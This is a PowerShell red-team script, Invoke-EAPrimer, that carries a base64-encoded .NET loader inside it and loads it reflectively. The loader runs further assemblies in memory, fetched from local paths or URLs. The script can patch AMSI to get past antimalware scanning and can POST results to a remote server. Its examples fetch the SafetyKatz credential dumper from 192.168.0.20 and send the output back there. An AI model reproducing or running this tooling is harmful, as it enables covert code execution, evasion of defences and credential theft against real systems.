function Invoke-EAPrimer
{
    <#
    .SYNOPSIS

    This script loads the .Net assembly EAPrimer.exe that will dynamically loads other .Net assemblies for
    in-memory execution. Input assemblies are accepted in the form of local file paths or URLs via the "Path"
    parameter.

    By default output will be displayed in the console. This can be redirected by the user through the
    "POST" parameter to write to a file or even send results via HTTP POST request.

    Author: @m8r0wn
    License: MIT
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    Uses EAPrimer.exe to load .NET assemblies for in-memory execution.

    .PARAMETER Path
    Path to target assembly for execution. This can be a local file path or URL.

    .PARAMETER Post
    Write results to a file or provide URL to send via HTTP POST request to a remote server. By
    default, output will be displayed in the terminal.

    .PARAMETER Args
    Optional, pass arguments to assembly for execution.

    .PARAMETER  Help
    Show EAPrimer.exe help menu.

    .PARAMETER  SkipAMSI
    Skip AMSI in-memory patch before loading assembly.

    .EXAMPLE
    Execute local seatbelt.exe and write output to file.
    Invoke-EAPrimer -Path .\Seatbelt.exe -Post output.exe

    .EXAMPLE
    Execute safetykatz.exe from url and post output to remote server.
    Invoke-EAPrimer -Path http://192.168.0.20/safetykatz.exe -Post http://192.168.0.20
    #>
    Param(
        [Parameter(Position=0, Mandatory=$true)]
        [String]
        $Path,

        [Parameter(Position=1)]
        [String]
        $Post,

        [Parameter(Position=2)]
        [String]
        $Args,

	[Parameter(Position=3)]
        [Switch]
        $Help=$flase,

	[Parameter(Position=4)]
        [Switch]
        $SkipAMSI=$flase
    )
    $assekblyString = "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
gGRAABAXoGTACJAGgBUQAJAb0BVQARAUABWwARAZwGYwAhAXQBaQApAX4DcAApAVEEdQA5AW0FBgA5AfgFfABJAUUBggBBAYYEiAA5Af0DkAA5AfQAlwAMAG0FBgBZAagDsgBZAR0EtwBZAR0EvQAMAIYEwgBZAS0HygAJAb0G5QCh
AG0FBgAMAOgG6gAJAcUG8AAMAKsG9gAJAb0B+gAMAH0E/wAJAb0BBgFZAT4EDQFhAdwFNADRAO4DEgGBAAoEUQBZATYGGAGhABoFHgGZADgEBgCpAG0FEABxAfEBBgCBAG0FBgAIACkALQEuAAsAdwEuABMAgAEuABsAnwEuACMAqA
EuACsAtgEuADMAtgEuADsAtgEuAEMAqAEuAEsAvAEuAFMAtgEuAFsAtgEuAGMA1AEuAGsA/gEuAHMACwJjAHsAUwIBAAYAAAAEACMAnQDNAEIAqwAAAQMAEwYBAAABBQAhBwEAAAEHAFMGAQAIOwAAAQAQOwAAAgAEgAAAAQAAAAAA
AAAAAAAAAAA/BQAABAAAAAAAAAAAAAAAJAEcAQAAAAAEAAAAAAAAAAAAAAAkAaMEAAAAAAQAAwAAAAAAAEQ4NEY0QzEyMDAwNUYxODM3REM2NUMwNDE4MUYzREE5NDY2QjEyM0ZDMzY5QzM1OUEzMDFCQUJDMTIwNjE1NzAAa2Vybm
VsMzIARGljdGlvbmFyeWAyAF9fU3RhdGljQXJyYXlJbml0VHlwZVNpemU9NgBnZXRfVVRGOAA8TW9kdWxlPgA8UHJpdmF0ZUltcGxlbWVudGF0aW9uRGV0YWlscz4AMEM1MEM2N0U4Mzk0NzJDRDYxMkQ2MDMzMTA5RjVFMDMyOTg3
RTQ4RTM2NzI0N0YyOUMwRUIzMEExRDNFQjVGQwBVUkwAU3lzdGVtLklPAERvd25sb2FkRGF0YQBQb3N0RGF0YQBwb3N0RGF0YQBDb3B5RGF0YQBtc2NvcmxpYgBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYwBMb2FkAEFkZABTeX
N0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQAZ2V0X01lc3NhZ2UASW52b2tlAElEaXNwb3NhYmxlAFJ1bnRpbWVGaWVsZEhhbmRsZQBGaWxlAENvbnNvbGUAaE1vZHVsZQBwcm9jTmFtZQBuYW1lAFdyaXRlTGluZQBWYWx1ZVR5
cGUAU2VjdXJpdHlQcm90b2NvbFR5cGUATWV0aG9kQmFzZQBEaXNwb3NlAENvbXBpbGVyR2VuZXJhdGVkQXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYm
x5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAVGFyZ2V0RnJhbWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFz
c2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cm
lidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEJ5dGUAc2V0X0V4cGVjdDEwMENvbnRpbnVlAEVBUHJpbWVyLmV4ZQBkd1NpemUASW5kZXhPZgBkYXRhU3R1ZmYARW5jb2RpbmcAU3lzdGVtLlJ1bnRpbWUuVmVyc2lv
bmluZwBGcm9tQmFzZTY0U3RyaW5nAFRvQmFzZTY0U3RyaW5nAFVwbG9hZFN0cmluZwBUb1N0cmluZwBHZXRTdHJpbmcAU3Vic3RyaW5nAEFwcGx5TWVtb3J5UGF0Y2gARmx1c2gAU3RhcnRzV2l0aABNYXJzaGFsAHNldF9TZWN1cm
l0eVByb3RvY29sAFByb2dyYW0Ac29tZVBsYWNlSW5NZW0AZ2V0X0l0ZW0Ac2V0X0l0ZW0AZ2V0X0lzNjRCaXRPcGVyYXRpbmdTeXN0ZW0ATWFpbgBTeXN0ZW0uUmVmbGVjdGlvbgBOYW1lVmFsdWVDb2xsZWN0aW9uAFdlYkhlYWRl
ckNvbGxlY3Rpb24ARXhjZXB0aW9uAE1ldGhvZEluZm8AaG9sZGVyRm9vAEh0dHBSZXF1ZXN0SGVhZGVyAEdldFN0cmluZ0J1aWxkZXIAU2VydmljZVBvaW50TWFuYWdlcgBFQVByaW1lcgBTdHJpbmdXcml0ZXIAU3RyZWFtV3JpdG
VyAFRleHRXcml0ZXIALmN0b3IAVUludFB0cgBTeXN0ZW0uRGlhZ25vc3RpY3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAUmVhZEFs
bEJ5dGVzAFBhcnNlQXJncwBhcmdzAGdldF9IZWFkZXJzAFJ1bnRpbWVIZWxwZXJzAEdldFByb2NBZGRyZXNzAGxwQWRkcmVzcwBhcmd1bWVudHMAQ29uY2F0AE9iamVjdABscGZsT2xkUHJvdGVjdABWaXJ0dWFsUHJvdGVjdABmbE
5ld1Byb3RlY3QAU3lzdGVtLk5ldABvcF9FeHBsaWNpdABXZWJDbGllbnQARW52aXJvbm1lbnQAZ2V0X0VudHJ5UG9pbnQAZ2V0X0NvdW50AENvbnZlcnQAZ2V0X091dABTZXRPdXQAU3lzdGVtLlRleHQASW5pdGlhbGl6ZUFycmF5
AENvbnRhaW5zS2V5AGI2NEFzc2VtYmx5AEV4ZWN1dGVBc3NlbWJseQBHZXRBc3NlbWJseQBDb3B5AExvYWRMaWJyYXJ5AEVtcHR5AAAAGVkAVwAxAHoAYQBTADUAawBiAEcAdwA9AAApUQBXADEAegBhAFYATgBqAFkAVwA1AEMAZA
BXAFoAbQBaAFgASQA9AAAPWwAhAF0AIAB7ADAAfQAAFXUAcwBlAHIALQBhAGcAZQBuAHQAAYDZTQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAAMQAwAC4AMAA7ACAAVwBPAFcANgA0ACkAIABB
AHAAcABsAGUAVwBlAGIASwBpAHQALwA1ADMANwAuADMANgAgACgASwBIAFQATQBMACwAIABsAGkAawBlACAARwBlAGMAawBvACkAIABDAGgAcgBvAG0AZQAvADYAMgAuADAALgAzADIAMAAyAC4AOQAgAFMAYQBmAGEAcgBpAC8ANQ
AzADcALgAzADYAAENhAHAAcABsAGkAYwBhAHQAaQBvAG4ALwB4AC0AdwB3AHcALQBmAG8AcgBtAC0AdQByAGwAZQBuAGMAbwBkAGUAZAABCVAATwBTAFQAAAEACy0AcABvAHMAdAABCy0AaABlAGwAcAABCy0AcABhAHQAaAABRQoA
CQAJADwALQAtAC0ALQA8ADwAIABFAEEAUAByAGkAbQBlAHIAIAB2ADAALgAxAC4AMQAgAD4APgAtAC0ALQAtAD4AARNBAHIAZwB1AG0AZQBuAHQAcwAAZS0AcABhAHQAaAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAF
UAUgBMACAAbwByACAAbABvAGMAYQBsACAAcABhAHQAaAAgAHQAbwAgAGEAcwBzAGUAbQBiAGwAeQABgNUtAHAAbwBzAHQAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABMAG8AYwBhAGwAIABwAGEAdABoACAAZgBvAHIA
IABvAHUAdABwAHUAdAAgAG8AcgAgAFUAUgBMACAAdABvACAAUABPAFMAVAAgAGIAYQBzAGUANgA0ACAAZQBuAGMAbwBkAGUAZAAgAHIAZQBzAHUAbAB0AHMALgAgAEQAZQBmAGEAdQBsAHQAOgAgAGMAbwBuAHMAbwBsAGUAIABvAH
UAdABwAHUAdAAuAAFvLQBhAHIAZwBzACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQQBkAGQAIABhAHIAZwB1AG0AZQBuAHQAcwAgAGYAbwByACAAdABhAHIAZwBlAHQAIABhAHMAcwBlAG0AYgBsAHkALgABYy0AcwBr
AGkAcAAtAGEAbQBzAGkAIAAgACAAIAAgACAAIAAgACAAIAAgAFMAawBpAHAAIABBAE0AUwBJACAAaQBuACAAbQBlAG0AbwByAHkAIABwAGEAdABjAGgALgAKAAoAAYDFRQBBAFAAcgBpAG0AZQByAC4AZQB4AGUAIAAtAHAAYQB0AG
gAPQBoAHQAdABwAHMAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyAC8AUwBlAGEAdABiAGUAbAB0AC4AZQB4AGUAIAAtAHAAbwBzAHQAPQBoAHQAdABwAHMAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyACAALQBhAHIAZwBz
AD0AIgAtAGcAcgBvAHUAcAA9AGEAbABsACIACgAKAAEVLQBzAGsAaQBwAC0AYQBtAHMAaQABOVsAKgBdACAAQQBwAHAAbAB5AGkAbgBnACAASQBuAC0ATQBlAG0AbwByAHkAIABQAGEAdABjAGgAAQstAGEAcgBnAHMAATFbACoAXQ
AgAEEAcwBzAGUAbQBiAGwAeQAgAEEAcgBnAHMAOgAgACIAewAwAH0AIgAAD2gAdAB0AHAAOgAvAC8AABFoAHQAdABwAHMAOgAvAC8AADtbACoAXQAgAEwAbwBhAGQAaQBuAGcAIABBAHMAZQBtAGIAbAB5ACAAZgByAG8AbQA6ACAA
ewAwAH0AAClbAC0AXQAgAEUAQQBQAHIAaQBtAGUAcgAgAEUAcgByAG8AcgA6ACAAAQAAgjVuqkvU5ke6016Os6khUgAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECCAAEAR0FCBgICwcGGAkJHQUdBRJFBAAAEmUFAAEdBQ4FIAEOHQ
UDAAACBwACARJ5EX0EAAEZCwMgAA4FAAIBDhwHAAESgIkdBQUgABKAjQYgAhwcHRwEAAEBAgYAAQERgJkFIAASgKEFIAIBDg4HIAIBEYCpDgYgAw4ODg4FIAEdBQ4NBwUVEkkCDg4dDggOCAYVEkkCDg4EIAEIAwUgAg4ICAQgAQ4I
ByACARMAEwECBg4XBwkOHQUdDhJNFRJJAg4OElEdHBJFElUEAAASTQUgAQITAAUAAQESTQMgAAgEAAEBDgYgARMBEwAGAAIBDh0cBCABAg4FAAEOHQUFAAIODg4FIAASgLUIt3pcVhk04IkEAAAAAAIGCgMGERAFAAIYGA4EAAEYDg
gABAIYGQkQCQcAAwEdBRgIAwAAAQYAAgEOHQ4FAAIBDg4KAAEVEkkCDg4dDgUAAQEdDggBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAANAQAIRUFQcmltZXIAAAUBAAAAABcBABJDb3B5cmln
aHQgwqkgIDIwMjAAACkBACQzYmM0ZjZkOC02YmJmLTQzZDgtODljNC1kY2ZiNDg4MzNiMmMAAAwBAAcxLjAuMC4wAABHAQAaLk5FVEZyYW1ld29yayxWZXJzaW9uPXY0LjABAFQOFEZyYW1ld29ya0Rpc3BsYXlOYW1lEC5ORVQgRn
JhbWV3b3JrIDQEAQAAAAAAAACMVEztAAAAAAIAAABeAAAAUDoAAFAcAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAUlNEUxZ2HxIXAmdJoLZDCv3Boo0BAAAARDpcTmV0X1NoYXJlJFx0b29sc19kb3RuZXRcRUFQcmltZXJc
RUFQcmltZXJcb2JqXFJlbGVhc2VcRUFQcmltZXIucGRiANY6AAAAAAAAAAAAAPA6AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAADiOgAAAAAAAAAAAAAAAF9Db3JFeGVNYWluAG1zY29yZWUuZGxsAAAAAAAAAP8lACBAALhXAAeAwh
gAuFcAB4DDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACABAAAA
AgAACAGAAAAFAAAIAAAAAAAAAAAAAAAAAAAAEAAQAAADgAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAEAAQAAAGgAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAKwDAACQQAAAHAMAAAAAAAAAAAAAHAM0AAAA
VgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8AAAAAAAAABAAAAAEAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQABAAAAFQAcgBhAG
4AcwBsAGEAdABpAG8AbgAAAAAAAACwBHwCAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBuAGYAbwAAAFgCAAABADAAMAAwADAAMAA0AGIAMAAAABoAAQABAEMAbwBtAG0AZQBuAHQAcwAAAAAAAAAiAAEAAQBDAG8AbQBwAGEAbgB5
AE4AYQBtAGUAAAAAAAAAAAA6AAkAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAARQBBAFAAcgBpAG0AZQByAAAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA6AA0AAQ
BJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEUAQQBQAHIAaQBtAGUAcgAuAGUAeABlAAAAAABIABIAAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIAAgADIAMAAyADAAAAAqAAEA
AQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAEIADQABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABFAEEAUAByAGkAbQBlAHIALgBlAHgAZQAAAAAAMgAJAAEAUAByAG8AZAB1AGMAdABOAG
EAbQBlAAAAAABFAEEAUAByAGkAbQBlAHIAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAw
AC4AMAAAALxDAADqAQAAAAAAAAAAAADvu788P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJVVEYtOCIgc3RhbmRhbG9uZT0ieWVzIj8+DQoNCjxhc3NlbWJseSB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc2
0udjEiIG1hbmlmZXN0VmVyc2lvbj0iMS4wIj4NCiAgPGFzc2VtYmx5SWRlbnRpdHkgdmVyc2lvbj0iMS4wLjAuMCIgbmFtZT0iTXlBcHBsaWNhdGlvbi5hcHAiLz4NCiAgPHRydXN0SW5mbyB4bWxucz0idXJuOnNjaGVtYXMtbWlj
cm9zb2Z0LWNvbTphc20udjIiPg0KICAgIDxzZWN1cml0eT4NCiAgICAgIDxyZXF1ZXN0ZWRQcml2aWxlZ2VzIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MyI+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdX
Rpb25MZXZlbCBsZXZlbD0iYXNJbnZva2VyIiB1aUFjY2Vzcz0iZmFsc2UiLz4NCiAgICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8L3NlY3VyaXR5Pg0KICA8L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+AAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAwAAAAEOwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
    $assemblyBytes = [System.Convert]::FromBase64String($assekblyString)
    [System.Reflection.Assembly]::Load($assemblyBytes) | Out-Null


    # Execute & EAPrimer will handle output
    $parameters=@("-path=$Path")

    if ($Post)
    {
        $parameters += "-post=$Post"
    }

    if ($Args)
    {
        $parameters += "-args=$Args"
    }

    if ($SkipAMSI)
    {
        $parameters += "-skip-amsi"
    }

    if ($Help)
    {
        $parameters += "-help"
    }

    [EAPrimer.Program]::Main($parameters)
}